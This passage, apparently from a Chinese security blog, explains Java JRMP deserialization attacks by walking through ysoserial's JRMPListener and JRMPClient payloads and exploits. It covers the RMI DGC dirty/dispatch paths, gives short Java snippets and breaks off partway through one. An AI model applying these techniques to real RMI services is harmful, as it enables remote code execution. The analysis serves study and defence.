@@ -1,0 +1,522 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>Java JRMP 反序化 - Gaorenyusi&#39;s Blog</title><meta name="Description" content="白茶清欢无别事，我在等风也等你"><meta property="og:url" content="http://localhost:1313/posts/jrmp/">
+  <meta property="og:site_name" content="Gaorenyusi&#39;s Blog">
+  <meta property="og:title" content="Java JRMP 反序化">
+  <meta property="og:description" content="白茶清欢无别事，我在等风也等你">
+  <meta property="og:locale" content="zh_CN">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-07-01T20:58:47+00:00">
+    <meta property="article:modified_time" content="2024-07-01T20:58:47+00:00">
+    <meta property="article:tag" content="Java">
+    <meta property="article:tag" content="反序列化">
+    <meta property="og:image" content="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/logo.webp">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/logo.webp">
+  <meta name="twitter:title" content="Java JRMP 反序化">
+  <meta name="twitter:description" content="白茶清欢无别事，我在等风也等你">
+<meta name="application-name" content="gaorenyusi">
+<meta name="apple-mobile-web-app-title" content="gaorenyusi"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/logo.webp"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://localhost:1313/posts/jrmp/" /><link rel="prev" href="http://localhost:1313/posts/rm2/" /><link rel="next" href="http://localhost:1313/posts/jep290/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Java JRMP 反序化",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/localhost:1313\/posts\/jrmp\/"
+        },"image": ["https:\/\/gaorenyusi.oss-cn-chengdu.aliyuncs.com\/img\/logo.webp"],"genre": "posts","keywords": "java, 反序列化","wordcount":  3526 ,
+        "url": "http:\/\/localhost:1313\/posts\/jrmp\/","datePublished": "2024-07-01T20:58:47+00:00","dateModified": "2024-07-01T20:58:47+00:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "gaorenyusi","logo": "https:\/\/gaorenyusi.oss-cn-chengdu.aliyuncs.com\/img\/logo.webp"},"author": {
+                "@type": "Person",
+                "name": "gaorenyusi"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script>(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Gaorenyusi&#39;s Blog">Gaorenyusi&#39;s Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/"> 主页 </a><a class="menu-item" href="/posts/"> 文章 </a><a class="menu-item" href="/categories/"> 分类 </a><a class="menu-item" href="/tags/"> 标签 </a><a class="menu-item" href="/links/" title="友链"> 友链 </a><a class="menu-item" href="/about/"> 关于 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Gaorenyusi&#39;s Blog">Gaorenyusi&#39;s Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/" title="">主页</a><a class="menu-item" href="/posts/" title="">文章</a><a class="menu-item" href="/categories/" title="">分类</a><a class="menu-item" href="/tags/" title="">标签</a><a class="menu-item" href="/links/" title="友链">友链</a><a class="menu-item" href="/about/" title="">关于</a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">目录</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Java JRMP 反序化</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>gaorenyusi</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/javasec/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Javasec</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2024-07-01">2024-07-01</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;约 3526 字&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;预计阅读 8 分钟&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#ysoserial-程序分析">ysoserial 程序分析</a>
+          <ul>
+            <li><a href="#payloadjrmplistener">payload/JRMPListener</a></li>
+            <li><a href="#exploitjrmpclient">exploit/JRMPClient</a></li>
+            <li><a href="#payloadjrmpclient">payload/JRMPClient</a></li>
+            <li><a href="#exploitjrmplistener">exploit/JRMPListener</a></li>
+          </ul>
+        </li>
+        <li><a href="#关于-jrmp-的两种攻击流程如下">关于 JRMP 的两种攻击流程如下</a>
+          <ul>
+            <li><a href="#第一种攻击方式">第一种攻击方式</a></li>
+            <li><a href="#第二种攻击方式">第二种攻击方式</a></li>
+          </ul>
+        </li>
+        <li><a href="#第一种攻击方式客户端攻击服务端">第一种攻击方式（客户端攻击服务端）</a></li>
+        <li><a href="#第二种攻击方式服务端攻击客户端">第二种攻击方式（服务端攻击客户端）</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h1 id="java-jrmp-反序化">Java JRMP 反序化</h1>
+<p>RMI 依赖的通信协议为 JRMP(Java Remote Message Protocol ，Java 远程消息交换协议)，该协议为 Java 定制，基于 TCP/IP 之上，RMI 协议之下，当需要进行 RMI 远程方法调用通信的时候要求服务端与客户端都为 Java 编写。</p>
+<p>这个协议就像 HTTP 协议一样，规定了客户端和服务端通信要满足的规范，RMI 底层默认使用的 JRMP 进行传递数据，并且 JRMP 协议只能作用于 RMI 协议。</p>
+<p>通过DGCImpl来实现攻击的也有两种，<code>DGCImpl_Stub#dirty</code>（服务端攻击客户端），还有个就是 <code>DGCImpl_Skel#dispatch</code>（客户端攻击服务端）</p>
+<p>之前看到 <code>DGCImpl_Skel#dispatch</code> 方法：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240902213400137.png"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240902213400137.png, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240902213400137.png 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240902213400137.png 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240902213400137.png"
+        title="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240902213400137.png" /></p>
+<p>存在个 case1 和 case2，分别对应了 <code>clear</code> 和 <code>dirty</code> 方法，和 <code>RgestryImpl_Skel#dispatch</code> 中异曲同工。而且这里的两种都有反序列化，</p>
+<h3 id="ysoserial-程序分析">ysoserial 程序分析</h3>
+<h4 id="payloadjrmplistener">payload/JRMPListener</h4>
+<p>调用链</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="复制到剪贴板"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">UnicastRemoteObject</span><span class="p">.</span><span class="na">readObject</span><span class="p">()</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">UnicastRemoteObject</span><span class="p">.</span><span class="na">reexport</span><span class="p">()</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">UnicastRemoteObject</span><span class="p">.</span><span class="na">exportObject</span><span class="p">()</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">UnicastServerRef</span><span class="p">.</span><span class="na">exportObject</span><span class="p">()</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">LiveRef</span><span class="p">.</span><span class="na">exportObject</span><span class="p">()</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">TCPEndpoint</span><span class="p">.</span><span class="na">exportObject</span><span class="p">()</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">TCPTransport</span><span class="p">.</span><span class="na">exportObject</span><span class="p">()</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="n">TCPTransport</span><span class="p">.</span><span class="na">listen</span><span class="p">()</span></span></span></code></pre></div></div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240902215005700.png"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240902215005700.png, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240902215005700.png 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240902215005700.png 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240902215005700.png"
+        title="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240902215005700.png" /></p>
+<p>通过 <code>createWithConstructor</code> 方法来实例化了一个 <code>UnicastRemoteObject</code> 对象，</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240902215621898.png"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240902215621898.png, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240902215621898.png 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240902215621898.png 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240902215621898.png"
+        title="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240902215621898.png" /></p>
+<p>看到就是通过反射调用进行实例化对象，看到其第四个参数是构造函数所需的具体参数也就是 <code>consArgs</code>，跟进第四个参数 <code>UnicastServerRef</code> 构造方法，</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240902220439803.png"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240902220439803.png, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240902220439803.png 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240902220439803.png 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240902220439803.png"
+        title="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240902220439803.png" /></p>
+<p>调用了其父类的构造方法，继续跟进。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240902220539782.png"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240902220539782.png, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240902220539782.png 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240902220539782.png 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240902220539782.png"
+        title="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240902220539782.png" /></p>
+<p>调用了其其他构造方法。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240902220717727.png"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240902220717727.png, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240902220717727.png 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240902220717727.png 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240902220717727.png"
+        title="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240902220717727.png" /></p>
+<p>嗯，和前面的 rmi 服务类注册没什么区别，<code>TCPEndpoint.getLocalEndpoint(port)</code> 就是一些对网络请求的处理，继续向下</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240902221413594.png"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240902221413594.png, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240902221413594.png 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240902221413594.png 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240902221413594.png"
+        title="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240902221413594.png" /></p>
+<p>其实也就没什么了，结束返回对象 <code>UnicastServerRef</code>，其中包含的 ref 如下</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240902221610030.png"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240902221610030.png, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240902221610030.png 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240902221610030.png 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240902221610030.png"
+        title="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240902221610030.png" /></p>
+<p>接着就是进入 <code>createWithConstructor</code> 方法了，这个就是刚才说的通过反射来进行实例化对象的方法，</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240902221815705.png"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240902221815705.png, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240902221815705.png 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240902221815705.png 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240902221815705.png"
+        title="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240902221815705.png" /></p>
+<p>首先进行获取 <code>consArgsTypes</code> 类型参数的构造方法，传入的 <code>constructorClass</code> 为 <code>RemoteObject</code>，所以获得的其构造方法。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240903001926807.png"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240903001926807.png, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240903001926807.png 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240903001926807.png 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240903001926807.png"
+        title="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240903001926807.png" /></p>
+<p>然后执行 <code>ReflectionFactory.getReflectionFactory().newConstructorForSerialization(classToInstantiate, objCons)</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240902222201415.png"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240902222201415.png, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240902222201415.png 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240902222201415.png 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240902222201415.png"
+        title="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240902222201415.png" /></p>
+<p>这样就可以绕过构造器直接进行实例化并且不会对进行 ref 进行初始化。最后获得实列 <code>ActivationGroupImpl</code>，这里还向上转型了 <code>UnicastRemoteObject</code>（这样可以避免直接实例化 <code>UnicastRemoteObject</code> 对象直接触发监听）。</p>
+<p>当正常对 <code>UnicastRemoteObject</code> 反序列化，会发现端口并不是指定的，而是一个随机端口，最后通过反射进行修改，传入的参数就是端口</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="复制到剪贴板"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">Reflections</span><span class="p">.</span><span class="na">getField</span><span class="p">(</span><span class="n">UnicastRemoteObject</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;port&#34;</span><span class="p">).</span><span class="na">set</span><span class="p">(</span><span class="n">uro</span><span class="p">,</span><span class="w"> </span><span class="n">jrmpPort</span><span class="p">);</span></span></span></code></pre></div></div><p>到这里构造 JRMP Listener 的 payload 就已经结束了。这个 <code>payload/JRMPListener</code> 的主要作用就是让被攻击机开启监听端口。</p>
+<h4 id="exploitjrmpclient">exploit/JRMPClient</h4>
+<p>而在ysoserial中，<code>exploit/JRMPClient</code> 调用了 <code>makeDGCCall</code>，主要为了调用 dirty 方法触发反序列化，传递一个用于反序列化的对象</p>
+<p>最后在远程 DGC 层触发反序列化，以达到攻击远程 DGC 层的目的。</p>
+<p>这个 exp 通常和上面的 payload 配合使用，当被攻击机开启端口后，就利用该 exp 发生恶意的链子进行反序列化。</p>
+<h4 id="payloadjrmpclient">payload/JRMPClient</h4>
+<p>反序列化 UnicastRef 类，UnicastRef 实现了 RemoteRef 接口，RemoteRef 接口又实现了 Externalizable 接口。</p>
+<p>其中在 <code>Externalizable</code> 接口定义了 <code>writeExternal</code> 和 <code>readExternal</code> 方法，</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240903195451361.png"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240903195451361.png, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240903195451361.png 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240903195451361.png 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240903195451361.png"
+        title="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240903195451361.png" /></p>
+<p>这两个方法分别实现了序列化和反序列化，<code>UnicastRef</code> 类中对这两个方法进行了重写。</p>
+<p>先看 <code>UnicastRef.readExternal</code> 方法：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240903195824635.png"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240903195824635.png, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240903195824635.png 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240903195824635.png 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240903195824635.png"
+        title="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240903195824635.png" /></p>
+<p>调用了 LiveRef.read 方法，跟进</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240903200600681.png"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240903200600681.png, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240903200600681.png 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240903200600681.png 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240903200600681.png"
+        title="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240903200600681.png" /></p>
+<p>其中 <code>TCPEndpoint.readHostPortFormat</code> 就是获取 host 和 port，返回一个封装了 host 和 port 的 TCPEndpoint。</p>
+<p>然后看到 new 了个 ref 对象。以前 RMI 中经常遇见这个对象，里面就是封装的一些 host,port,objid 等信息。看到如果输入流的类型就可以不是 <code>ConnectionInputStream</code> 类型（这个输出流我们是可以进行控制的），那么就会进入 else 语句</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240903200900291.png"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240903200900291.png, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240903200900291.png 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240903200900291.png 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240903200900291.png"
+        title="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240903200900291.png" /></p>
+<p>调用 <code>DGCClient.registerRefs()</code> 方法，跟进该方法</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240903201047351.png"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240903201047351.png, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240903201047351.png 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240903201047351.png 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240903201047351.png"
+        title="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240903201047351.png" /></p>
+<p>看到调用 lookup 方法，然后返回的 <code>EndpointEntry</code> 对象调用 <code>registerRefs()</code> 方法，在该方法结尾处调用</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240903201250116.png"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240903201250116.png, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240903201250116.png 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240903201250116.png 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240903201250116.png"
+        title="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240903201250116.png" /></p>
+<p>跟进 <code>makeDirtyCall</code> 方法，其中会调用 <code>DGC.dirty</code> 方法，</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240903201458018.png"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240903201458018.png, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240903201458018.png 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240903201458018.png 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240903201458018.png"
+        title="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/image-20240903201458018.png" /></p>
+<p>实际会调用 <code>DGCImpl_Stub.dirty</code> 方法，这个方法下调用了 newCall 方法建立一次连接，还会会对 remoteCall 进行一次反序列化</p>
+<p>所以这里利用下面方法方法创建了个 <code>UnicastRef</code> 对象</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="复制到剪贴板"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">ObjID</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ObjID</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">Random</span><span class="p">().</span><span class="na">nextInt</span><span class="p">());</span><span class="w"> </span><span class="c1">// RMI registry  </span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">TCPEndpoint</span><span class="w"> </span><span class="n">te</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">TCPEndpoint</span><span class="p">(</span><span class="n">host</span><span class="p">,</span><span class="w"> </span><span class="n">port</span><span class="p">);</span><span class="w">  
